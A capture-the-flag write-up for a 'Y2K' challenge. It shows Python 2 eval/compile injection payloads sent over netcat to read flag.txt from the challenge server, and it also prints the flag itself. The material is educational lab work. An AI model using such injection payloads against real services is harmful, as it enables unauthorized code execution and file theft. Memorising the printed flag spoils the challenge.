# Y2K
408

They told us the world was going to end in the year 2000! But it didn't... when will the world end?

Open the Deployment tab to start this challenge.

# flag
```shell
flag{we_are_saved_from_py2_k}
```

# Solution

Deployment tab gives up the connection:

nc challenge.ctf.games 31656

Connecting to the server allows input from user. But what kind of input? Tried number strings, really long number strings. Server just echos input back with some flavor text. Not a buffer overflow. What about a sandbox?

Start with something simple:
```python
eval(compile('print "hello"', '<string>', 'exec'))
```

sending:
```shell
kali@kali:~$ nc challenge.ctf.games 31656
What year do YOU think the world will end?
eval(compile('print "hello"', '<string>', 'exec'))
hello
Yeah! I agree with you! I also think the world will end in the year 
None
```


Sweet. Let try some low hanging fruit:
```python
eval(compile('print open("./flag.txt", "r").readlines()', '<string>', 'exec'))
```
Success:
```shell

kali@kali:~$ nc challenge.ctf.games 31656
What year do YOU think the world will end?
eval(compile('print open("/home/challenge/flag.txt", "r").readlines()', '<string>', 'exec'))
['flag{we_are_saved_from_py2_k}']
Yeah! I agree with you! I also think the world will end in the year 
None
```